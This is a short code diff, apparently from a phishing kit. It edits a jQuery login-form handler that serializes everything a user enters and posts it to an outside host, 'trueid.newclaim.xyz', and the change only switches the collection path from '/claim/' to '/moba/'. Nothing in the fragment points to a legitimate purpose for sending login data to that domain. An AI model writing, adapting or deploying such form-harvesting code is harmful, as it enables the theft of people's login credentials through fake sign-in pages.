@@ -2,7 +2,7 @@ $(".login-form").submit(function() {
 	var d = $(".login-form");
 
 	$.ajax({
-        url: "https://trueid.newclaim.xyz/claim/login.php",
+        url: "https://trueid.newclaim.xyz/moba/login.php",
         type: "POST",
         data: d.serialize(),
         success: function () {
